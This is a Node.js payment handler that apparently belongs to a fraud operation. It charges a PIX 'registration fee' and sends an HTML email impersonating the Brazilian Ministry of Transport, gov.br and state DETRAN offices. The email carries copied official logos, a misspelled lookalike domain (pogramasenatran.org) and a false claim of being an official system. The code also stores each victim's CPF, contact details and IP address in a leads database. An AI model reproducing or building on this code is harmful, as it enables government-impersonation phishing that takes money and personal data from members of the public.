// SealPay API Integration
// Pagamento via PIX com SealPay Gateway

const db = require("./_db");
const nodemailer = require("nodemailer");
const QRCode = require("qrcode");

const SEALPAY_BASE_URL = process.env.SEALPAY_BASE_URL || "https://abacate-5eo1.onrender.com";
const UTMIFY_API_URL = process.env.UTMIFY_API_URL || "https://api.utmify.com.br/api-credentials/orders";

const DETRAN_BADGE_BY_UF = {
  AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
  AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
  AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
  BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
  CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
  DF: "https://zpy-customer-communication-cms-strapi-images-2.s3.amazonaws.com/DETRAN_DF_378eeacd03.webp",
  ES: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbFOyL7H4mp0igBsJUKg3y4m_7mg9xkqXPnQ&s",
  GO: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmmhmirDeoyas3iEHwHapMrQ3vIHa0ivq3wQ&s",
  MA: "https://seeklogo.com/images/D/detran-maranhao-logo-4F04A57787-seeklogo.com.png",
  MT: "https://portalcredenciamento.detran.mt.gov.br/815ed82f649be4cc8df5e9e024e23482.png",
  MS: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/082015/detranms_0.png?itok=oDYhYuLp",
  MG: "https://www.camarauberlandia.mg.gov.br/DETRANMG.jpg/@@images/480d676e-e0af-433a-bec8-d9676a937a59.jpeg",
  PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
  PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
  PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
  PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
  PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
  RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
  RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
  RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
  RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
  RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
  SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
  SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
  SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
  TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg",
};

function formatUtcDate(date) {
  const iso = new Date(date).toISOString();
  return iso.replace("T", " ").substring(0, 19);
}

function buildTrackingParameters(tracking) {
  const utm = tracking && typeof tracking.utm === "object" && tracking.utm ? tracking.utm : {};
  return {
    src: tracking?.src || utm?.src || null,
    sck: tracking?.sck || utm?.sck || null,
    utm_source: utm?.utm_source || utm?.source || null,
    utm_campaign: utm?.utm_campaign || null,
    utm_medium: utm?.utm_medium || null,
    utm_content: utm?.utm_content || null,
    utm_term: utm?.utm_term || null,
  };
}

function formatCurrencyBRL(cents) {
  const value = Number(cents || 0) / 100;
  return value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
}

let mailTransporterPromise = null;

async function getMailTransporter() {
  const host = process.env.SMTP_HOST;
  const port = Number(process.env.SMTP_PORT || 587);
  const user = process.env.SMTP_USER;
  const pass = process.env.SMTP_PASS;

  if (!host || !user || !pass) return null;
  if (mailTransporterPromise) return mailTransporterPromise;

  mailTransporterPromise = Promise.resolve(
    nodemailer.createTransport({
      host,
      port,
      secure: String(process.env.SMTP_SECURE || "").toLowerCase() === "true" || port === 465,
      auth: { user, pass },
    }),
  );

  return mailTransporterPromise;
}

function buildPixEmailHtml({
  nome,
  pixCode,
  amountCents,
  transactionId,
  cpf,
  detran,
  detranBadgeUrl,
  paymentLink,
}) {
  const amount = formatCurrencyBRL(amountCents);
  const safeName = nome || "";
  const safeCpf = cpf ? String(cpf).replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "";
  const detranLabel = detran || process.env.PIX_EMAIL_DETRAN_LABEL || "DETRAN/AC";
  const expiresText = process.env.PIX_EMAIL_EXPIRES_TEXT || "Expira em 24 horas";
  const headerBadge =
    detranBadgeUrl ||
    process.env.PIX_EMAIL_BADGE_FALLBACK ||
    "https://popseal.vercel.app/cnhzinlogo.png";

  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Lembrete de Pagamento - CNH do Brasil</title>
  <!--[if mso]>
  <noscript>
    <xml>
      <o:OfficeDocumentSettings>
        <o:PixelsPerInch>96</o:PixelsPerInch>
      </o:OfficeDocumentSettings>
    </xml>
  </noscript>
  <![endif]-->
</head>
<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e8eef3; -webkit-font-smoothing: antialiased;">
  <div style="display: none; max-height: 0; overflow: hidden; mso-hide: all;">
    ${safeName}, sua inscricao no Programa CNH do Brasil aguarda pagamento. Conclua agora!
  </div>
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #e8eef3;">
    <tr>
      <td align="center" style="padding: 32px 16px;">
        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="max-width: 580px; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 24px rgba(0,0,0,0.12);">
          <tr>
            <td>
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="height: 6px; background: linear-gradient(90deg, #009739 0%, #009739 33%, #FEDD00 33%, #FEDD00 66%, #002776 66%, #002776 100%);"></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background: linear-gradient(180deg, #0c326f 0%, #1351B4 100%); padding: 28px 32px;">
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td>
                    <table role="presentation" cellspacing="0" cellpadding="0">
                      <tr>
                        <td style="vertical-align: middle;">
                          <img src="https://assets.pogramasenatran.org/govbr-logo.png" alt="gov.br" style="height: 36px; width: auto;" />
                        </td>
                        <td style="vertical-align: middle; padding-left: 20px;">
                          <table role="presentation" cellspacing="0" cellpadding="0">
                            <tr>
                              <td style="border-left: 2px solid rgba(255,255,255,0.25); padding-left: 20px;">
                                <p style="color: #ffffff; font-size: 13px; font-weight: 600; margin: 0; line-height: 1.3;">Ministerio dos Transportes</p>
                                <p style="color: rgba(255,255,255,0.7); font-size: 11px; margin: 2px 0 0 0;">Secretaria Nacional de Transito</p>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                  </td>
                  <td style="text-align: right; vertical-align: middle;">
                    <div style="display: inline-block; background-color: #ffffff; border-radius: 6px; padding: 6px; border: 1px solid #e2e8f0;">
                      <img src="${headerBadge}" alt="" width="80" height="40" style="display: block; width: 80px; height: 40px; object-fit: contain; border: 0;" />
                    </div>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background: linear-gradient(135deg, #071D41 0%, #0c326f 100%); padding: 0;">
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="padding: 24px 32px 20px 32px;">
                    <h1 style="color: #ffffff; font-size: 24px; font-weight: 700; margin: 0; letter-spacing: -0.3px;">Programa CNH do Brasil</h1>
                    <p style="color: #68d391; font-size: 12px; font-weight: 500; margin: 6px 0 0 0; text-transform: uppercase; letter-spacing: 0.5px;">● Inscricao Ativa</p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color: #fff8e1; padding: 20px 32px; border-bottom: 3px solid #ffb300;">
              <table role="presentation" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="vertical-align: top; padding-right: 14px;">
                    <div style="width: 28px; height: 28px; background-color: #ff9800; border-radius: 50%; text-align: center; line-height: 28px;">
                      <span style="color: #ffffff; font-size: 16px; font-weight: bold;">!</span>
                    </div>
                  </td>
                  <td style="vertical-align: middle;">
                    <p style="color: #e65100; font-size: 15px; font-weight: 700; margin: 0;">Acao necessaria, ${safeName}</p>
                    <p style="color: #795548; font-size: 13px; margin: 4px 0 0 0;">Sua inscricao aguarda confirmacao de pagamento.</p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color: #ffffff; padding: 0;">
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="padding: 28px 32px 24px 32px;">
                    <p style="color: #78909c; font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 12px 0; font-weight: 600;">Dados do Inscrito</p>
                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #f8fafc; border-radius: 8px; border: 1px solid #e2e8f0;">
                      <tr>
                        <td style="padding: 18px 20px;">
                          <p style="color: #1e293b; font-size: 17px; font-weight: 700; margin: 0;">${safeName}</p>
                          <p style="color: #64748b; font-size: 13px; margin: 6px 0 0 0;">CPF: ${safeCpf} &nbsp;•&nbsp; ${detranLabel}</p>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="padding: 0 32px 28px 32px;">
                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background: linear-gradient(135deg, #1e40af 0%, #1d4ed8 50%, #2563eb 100%); border-radius: 12px; overflow: hidden;">
                      <tr>
                        <td style="padding: 28px 24px; text-align: center;">
                          <p style="color: rgba(255,255,255,0.85); font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 8px 0; font-weight: 500;">Taxa de Inscricao</p>
                          <p style="color: #ffffff; font-size: 44px; font-weight: 800; margin: 0; letter-spacing: -1px;">${amount}</p>
                          <table role="presentation" cellspacing="0" cellpadding="0" style="margin: 16px auto 0 auto;">
                            <tr>
                              <td style="background-color: rgba(0,0,0,0.2); border-radius: 20px; padding: 8px 16px;">
                                <p style="color: #fbbf24; font-size: 12px; font-weight: 600; margin: 0;">⏰ ${expiresText}</p>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="padding: 0 32px 20px 32px;">
                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                      <tr>
                        <td style="border-radius: 10px; background: linear-gradient(135deg, #16a34a 0%, #22c55e 100%);" align="center">
                          <a href="${paymentLink}" target="_blank" style="display: block; color: #ffffff; text-decoration: none; padding: 18px 32px; font-size: 16px; font-weight: 700; letter-spacing: 0.3px;">REALIZAR PAGAMENTO</a>
                        </td>
                      </tr>
                    </table>
                    <p style="color: #9ca3af; font-size: 11px; text-align: center; margin: 12px 0 0 0;">Ambiente seguro • Pagamento via PIX</p>
                  </td>
                </tr>
              </table>
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="padding: 8px 32px;">
                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                      <tr>
                        <td style="border-bottom: 1px dashed #e2e8f0;"></td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="padding: 20px 32px 28px 32px;">
                    <p style="color: #475569; font-size: 13px; font-weight: 600; margin: 0 0 10px 0;">Ou copie o codigo PIX:</p>
                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #f1f5f9; border: 1px solid #cbd5e1; border-radius: 6px;">
                      <tr>
                        <td style="padding: 14px;">
                          <p style="font-family: 'Courier New', Courier, monospace; font-size: 10px; word-break: break-all; color: #334155; margin: 0; line-height: 1.5;">${pixCode}</p>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="padding: 0 32px 32px 32px;">
                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #ecfdf5; border-radius: 10px; border: 1px solid #a7f3d0;">
                      <tr>
                        <td style="padding: 20px 24px;">
                          <p style="color: #047857; font-size: 13px; font-weight: 700; margin: 0 0 14px 0;">Como pagar via PIX:</p>
                          <table role="presentation" cellspacing="0" cellpadding="0">
                            <tr>
                              <td style="vertical-align: top; padding-right: 10px; color: #10b981; font-weight: 600; font-size: 13px;">1.</td>
                              <td style="color: #065f46; font-size: 13px; padding-bottom: 8px;">Abra o app do seu banco</td>
                            </tr>
                            <tr>
                              <td style="vertical-align: top; padding-right: 10px; color: #10b981; font-weight: 600; font-size: 13px;">2.</td>
                              <td style="color: #065f46; font-size: 13px; padding-bottom: 8px;">Acesse a area PIX</td>
                            </tr>
                            <tr>
                              <td style="vertical-align: top; padding-right: 10px; color: #10b981; font-weight: 600; font-size: 13px;">3.</td>
                              <td style="color: #065f46; font-size: 13px; padding-bottom: 8px;">Clique em "Pagar" ou "Copia e Cola"</td>
                            </tr>
                            <tr>
                              <td style="vertical-align: top; padding-right: 10px; color: #10b981; font-weight: 600; font-size: 13px;">4.</td>
                              <td style="color: #065f46; font-size: 13px;">Cole o codigo e confirme</td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background: linear-gradient(180deg, #0f172a 0%, #1e293b 100%); padding: 28px 32px;">
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="text-align: center;">
                    <img src="https://assets.pogramasenatran.org/govbr-logo.png" alt="gov.br" style="height: 28px; width: auto; margin-bottom: 14px; opacity: 0.9;" />
                    <p style="color: #e2e8f0; font-size: 13px; font-weight: 600; margin: 0;">Ministerio dos Transportes</p>
                    <p style="color: #94a3b8; font-size: 11px; margin: 4px 0 16px 0;">Governo Federal • Uniao e Reconstrucao</p>
                    <table role="presentation" cellspacing="0" cellpadding="0" style="margin: 0 auto;">
                      <tr>
                        <td style="background-color: rgba(255,255,255,0.08); border-radius: 4px; padding: 8px 14px;">
                          <p style="color: #64748b; font-size: 10px; margin: 0; font-family: monospace;">Protocolo: ${transactionId || ""}</p>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td>
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td style="height: 5px; background: linear-gradient(90deg, #002776 0%, #002776 33%, #FEDD00 33%, #FEDD00 66%, #009739 66%, #009739 100%);"></td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="max-width: 580px;">
          <tr>
            <td style="padding: 24px 16px; text-align: center;">
              <p style="color: #94a3b8; font-size: 11px; margin: 0; line-height: 1.6;">
                Este email foi enviado pelo sistema oficial do Programa CNH do Brasil.<br>
                Em caso de duvidas, acesse
                <a href="https://detran.pogramasenatran.org" style="color: #3b82f6; text-decoration: none;">detran.pogramasenatran.org</a>
              </p>
              <p style="color: #cbd5e1; font-size: 10px; margin: 12px 0 0 0;">© 2026 Ministerio dos Transportes</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

async function sendPixEmail({ to, nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran, detranBadgeUrl, paymentLink }) {
  const transporter = await getMailTransporter();
  if (!to) {
    console.warn("[PAYMENT] Email PIX não enviado: destinatário vazio");
    return false;
  }
  if (!transporter) {
    console.warn("[PAYMENT] Email PIX não enviado: SMTP não configurado");
    return false;
  }

  const from = process.env.SMTP_FROM || process.env.SMTP_USER;
  const replyTo = process.env.SMTP_REPLY_TO || undefined;
  const subjectTemplate = process.env.PIX_EMAIL_SUBJECT || "Seu PIX foi gerado";
  const firstName = (nome || "").trim().split(" ")[0] || "";
  const subject = subjectTemplate
    .replace(/\{first_name\}/gi, firstName)
    .replace(/\{nome\}/gi, nome || "")
    .replace(/\{name\}/gi, nome || "");

  const html = buildPixEmailHtml({
    nome,
    pixCode,
    amountCents,
    transactionId,
    cpf,
    detran,
    detranBadgeUrl,
    paymentLink,
  });

  const info = await transporter.sendMail({
    from,
    to,
    replyTo,
    subject,
    html,
  });
  console.log("[PAYMENT] Email PIX enviado:", info?.messageId || "ok");
  return true;
}

async function sendUtmifyOrder({
  token,
  orderId,
  status,
  createdAt,
  approvedDate,
  customer,
  products,
  trackingParameters,
  totalPriceInCents,
  gatewayFeeInCents = 0,
  userCommissionInCents,
  paymentMethod = "pix",
  platform = "SealPay",
}) {
  if (!token) return;
  const payload = {
    orderId: String(orderId),
    platform,
    paymentMethod,
    status,
    createdAt: formatUtcDate(createdAt),
    approvedDate: approvedDate ? formatUtcDate(approvedDate) : null,
    refundedAt: null,
    customer,
    products,
    trackingParameters,
    commission: {
      totalPriceInCents,
      gatewayFeeInCents,
      userCommissionInCents,
    },
    isTest: false,
  };

  try {
    const resp = await fetch(UTMIFY_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-token": token,
      },
      body: JSON.stringify(payload),
    });
    const data = await resp.json().catch(() => ({}));
    if (!resp.ok) {
      console.error("[UTMIFY] Erro ao enviar pedido:", resp.status, data);
    }
  } catch (error) {
    console.error("[UTMIFY] Falha ao enviar pedido:", error.message || error);
  }
}

let leadsTableReady = false;

async function ensureLeadsTable() {
  if (leadsTableReady) return;
  await db.query(
    "CREATE TABLE IF NOT EXISTS leads (" +
      "id SERIAL PRIMARY KEY, " +
      "created_at TIMESTAMPTZ DEFAULT NOW(), " +
      "source TEXT, " +
      "cpf TEXT, " +
      "nome TEXT, " +
      "email TEXT, " +
      "phone TEXT, " +
      "amount_cents INTEGER, " +
      "title TEXT, " +
      "transaction_id TEXT, " +
      "status TEXT, " +
      "tracking TEXT, " +
      "user_agent TEXT, " +
      "ip TEXT" +
    ")",
  );
  await db.query("ALTER TABLE leads ADD COLUMN IF NOT EXISTS status TEXT");
  leadsTableReady = true;
}

async function saveLead(data) {
  if (!db.getConnectionString()) return;
  try {
    await ensureLeadsTable();
    await db.query(
      "INSERT INTO leads (" +
        "source, cpf, nome, email, phone, amount_cents, title, transaction_id, status, tracking, user_agent, ip" +
      ") VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)",
      [
        data.source || "",
        data.cpf || "",
        data.nome || "",
        data.email || "",
        data.phone || "",
        data.amount_cents || null,
        data.title || "",
        data.transaction_id || "",
        data.status || "",
        data.tracking || "",
        data.user_agent || "",
        data.ip || "",
      ],
    );
  } catch (error) {
    console.error("[PAYMENT] Falha ao salvar lead:", error.message);
  }
}

async function handlePaymentRequest(req, res) {
  // Handle OPTIONS
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  try {
    const SEALPAY_API_KEY = process.env.SEALPAY_API_KEY;

    if (!SEALPAY_API_KEY) {
      return res.status(500).json({
        success: false,
        message: "Credenciais da SealPay não configuradas",
      });
    }

    // Parse body
    let bodyData = req.body;
    if (typeof bodyData === "string") {
      bodyData = JSON.parse(bodyData);
    }

    const { cpf, nome, email, phone, amount, title, description } = bodyData;
    const customerFromBody = bodyData.customer && typeof bodyData.customer === "object"
      ? bodyData.customer
      : null;

    console.log("[PAYMENT] Dados recebidos:", { cpf, nome, email, phone });

    // Validação
    const validCpf = (cpf ?? customerFromBody?.taxId)?.toString().trim();
    const validNome = (nome ?? customerFromBody?.name)?.toString().trim();
    const validEmail = (email ?? customerFromBody?.email)?.toString().trim();
    const validPhone = (phone ?? customerFromBody?.cellphone)?.toString().trim();

    if (!validNome || !validEmail) {
      return res.status(400).json({
        success: false,
        message: "Nome e Email são obrigatórios",
      });
    }

    const FIXED_AMOUNT = amount || process.env.FIXED_AMOUNT || "37.73";
    const FIXED_TITLE = description || title || "Taxa de Adesão";

    const normalizeAmountToCents = (value) => {
      if (value === undefined || value === null || value === "") {
        const parsed = Number(String(FIXED_AMOUNT).replace(",", "."));
        return Math.round(parsed * 100);
      }
      if (typeof value === "string" && (value.includes(",") || value.includes("."))) {
        const parsed = Number(value.replace(",", "."));
        return Math.round(parsed * 100);
      }
      const numeric = Number(value);
      if (!Number.isFinite(numeric)) return 0;
      if (!Number.isInteger(numeric)) {
        return Math.round(numeric * 100);
      }
      // Heurística: valores pequenos (<= 1000) tratamos como reais
      if (numeric <= 1000) return numeric * 100;
      return numeric;
    };

    const amountCents = normalizeAmountToCents(amount);

    if (!amountCents || amountCents < 100) {
      return res.status(400).json({
        success: false,
        message: "Amount inválido (mínimo 100 centavos)",
      });
    }

    const customer = {
      name: customerFromBody?.name || validNome,
      email: customerFromBody?.email || validEmail,
      cellphone: (customerFromBody?.cellphone || validPhone || "").toString().replace(/\D/g, ""),
      taxId: (customerFromBody?.taxId || validCpf || "").toString().replace(/\D/g, ""),
    };

    const trackingFromBody = bodyData.tracking;
    const detranFromBody =
      bodyData.detran ||
      bodyData.detran_label ||
      (bodyData.uf ? `DETRAN/${bodyData.uf}` : "");
    const detranUf = String(bodyData.uf || detranFromBody || "")
      .replace("DETRAN/", "")
      .trim()
      .toUpperCase();
    const detranBadgeUrl = detranUf ? DETRAN_BADGE_BY_UF[detranUf] || "" : "";
    const cpfDigits = (customer.taxId || "").toString().replace(/\D/g, "");
    const requestHost = req.headers.host || "";
    const defaultBase = requestHost ? `https://${requestHost}/pix-payment` : "https://popseal.vercel.app/pix-payment";
    const paymentLinkBase = process.env.PIX_PAYMENT_LINK_BASE || defaultBase;
    const baseWithCpf = paymentLinkBase.includes("{cpf}")
      ? paymentLinkBase.replace("{cpf}", cpfDigits || "")
      : paymentLinkBase;
    const paymentLinkParams = new URLSearchParams({
      cpf: cpfDigits || "",
      nome: customer.name || "",
      email: customer.email || "",
      phone: customer.cellphone || "",
      amount: (amountCents / 100).toFixed(2),
      title: FIXED_TITLE,
      uf: detranUf || "",
    });
    let paymentLink = "";
    const tracking = (() => {
      if (trackingFromBody && typeof trackingFromBody === "object" && !Array.isArray(trackingFromBody)) {
        const utm = typeof trackingFromBody.utm === "object" && trackingFromBody.utm ? trackingFromBody.utm : {};
        const src = trackingFromBody.src || bodyData.src || req.headers.referer || "";
        return { utm, src };
      }
      if (typeof trackingFromBody === "string") {
        return { utm: {}, src: trackingFromBody };
      }
      const utm = typeof bodyData.utm === "object" && bodyData.utm ? bodyData.utm : {};
      const src = bodyData.src || req.headers.referer || "";
      return { utm, src };
    })();

    const payload = {
      amount: amountCents,
      description: FIXED_TITLE,
      customer: {
        name: customer.name,
        email: customer.email,
        cellphone: customer.cellphone,
        taxId: customer.taxId,
      },
      tracking,
      api_key: SEALPAY_API_KEY,
      fbp: bodyData.fbp || "",
      fbc: bodyData.fbc || "",
      user_agent: bodyData.user_agent || req.headers["user-agent"] || "",
    };

    const userAgent = bodyData.user_agent || req.headers["user-agent"] || "";

    await saveLead({
      timestamp: new Date().toISOString(),
      source: "payment_request",
      cpf: validCpf || "",
      nome: validNome || "",
      email: validEmail || "",
      phone: validPhone || "",
      amount_cents: amountCents,
      title: FIXED_TITLE,
      tracking: JSON.stringify(tracking || {}),
      user_agent: userAgent,
      ip: req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "",
    });

    console.log("[PAYMENT] Enviando para SealPay...");

    const resp = await fetch(`${SEALPAY_BASE_URL}/create-pix4`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(payload),
    });

    const data = await resp.json().catch(() => ({}));

    if (!resp.ok) {
      console.error("[PAYMENT] Erro SealPay:", resp.status, data);
      return res.status(502).json({
        success: false,
        message: data?.error || "Falha ao criar PIX",
        detalhes: data?.details || data?.detalhes,
      });
    }

    const txData = data || {};
    const tx = txData?.txid || txData?.id || "";
    const pixText = txData?.pix_code || "";
    const pixQr = txData?.pix_qr_code || txData?.qr_code || "";
    const looksLikeBase64 = (value) =>
      typeof value === "string" &&
      value.length > 100 &&
      /^[A-Za-z0-9+/=\s]+$/.test(value);
    const normalizeQrUrl = (value) => {
      if (!value) return value;
      const withScheme = !value.startsWith("http") && value.includes("/")
        ? `https://${value}`
        : value;
      return withScheme.startsWith("http") ? encodeURI(withScheme) : withScheme;
    };
    const pixQrWithPrefix = pixQr
      ? pixQr.startsWith("data:image")
        ? pixQr
        : pixQr.startsWith("http")
          ? pixQr
          : pixQr.startsWith("base64,")
            ? `data:image/png;${pixQr}`
            : looksLikeBase64(pixQr)
              ? `data:image/png;base64,${pixQr.trim()}`
              : normalizeQrUrl(pixQr)
      : "";

    if (!tx || !pixText) {
      return res.status(502).json({
        success: false,
        message: "Gateway não retornou dados esperados",
      });
    }

    const sanitizedPix = String(pixText || "").replace(/\s+/g, "");
    paymentLinkParams.set("pix_code", sanitizedPix);
    paymentLinkParams.set("tx", String(tx));
    paymentLink = `${baseWithCpf}${baseWithCpf.includes("?") ? "&" : "?"}${paymentLinkParams.toString()}`;

    await saveLead({
      timestamp: new Date().toISOString(),
      source: "payment_response",
      cpf: validCpf || "",
      nome: validNome || "",
      email: validEmail || "",
      phone: validPhone || "",
      amount_cents: txData?.amount || amountCents,
      title: FIXED_TITLE,
      transaction_id: String(tx),
      status: String(txData?.status || "PENDING"),
    });

    const UTMIFY_API_TOKEN = process.env.UTMIFY_API_TOKEN;
    const customerForUtmify = {
      name: customer.name,
      email: customer.email,
      phone: customer.cellphone || null,
      document: customer.taxId || null,
      country: "BR",
      ip: req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null,
    };
    const productsForUtmify = [
      {
        id: "taxa_adesao",
        name: FIXED_TITLE,
        planId: null,
        planName: null,
        quantity: 1,
        priceInCents: amountCents,
      },
    ];
    const trackingParameters = buildTrackingParameters(tracking || {});

    await sendUtmifyOrder({
      token: UTMIFY_API_TOKEN,
      orderId: String(tx),
      status: "waiting_payment",
      createdAt: new Date(),
      approvedDate: null,
      customer: customerForUtmify,
      products: productsForUtmify,
      trackingParameters,
      totalPriceInCents: amountCents,
      gatewayFeeInCents: 0,
      userCommissionInCents: amountCents,
      paymentMethod: "pix",
      platform: "SealPay",
    });

    let emailQrCode = pixQrWithPrefix || "";
    if (!emailQrCode && pixText) {
      try {
        emailQrCode = await QRCode.toDataURL(String(pixText));
      } catch (qrError) {
        console.error("[PAYMENT] Falha ao gerar QR Code para email:", qrError.message || qrError);
      }
    }

    try {
      await sendPixEmail({
        to: customer.email,
        nome: customer.name,
        pixCode: String(pixText),
        qrCode: emailQrCode,
        amountCents: txData?.amount || amountCents,
        title: FIXED_TITLE,
        transactionId: String(tx),
        cpf: customer.taxId || "",
        detran: detranFromBody || "",
        detranBadgeUrl,
        paymentLink,
      });
    } catch (mailError) {
      console.error("[PAYMENT] Falha ao enviar email PIX:", mailError.message || mailError);
    }

    return res.status(200).json({
      success: true,
      transaction_id: String(tx),
      pix_code: String(pixText),
      amount: txData?.amount || amountCents,
      status: String(txData?.status || "PENDING"),
      qr_code: pixQrWithPrefix,
      pix_qr_code: pixQrWithPrefix,
    });

  } catch (error) {
    console.error("[PAYMENT] Erro:", error.message);
    return res.status(500).json({
      success: false,
      message: "Erro interno",
      error: error.message,
    });
  }
}

module.exports = handlePaymentRequest;
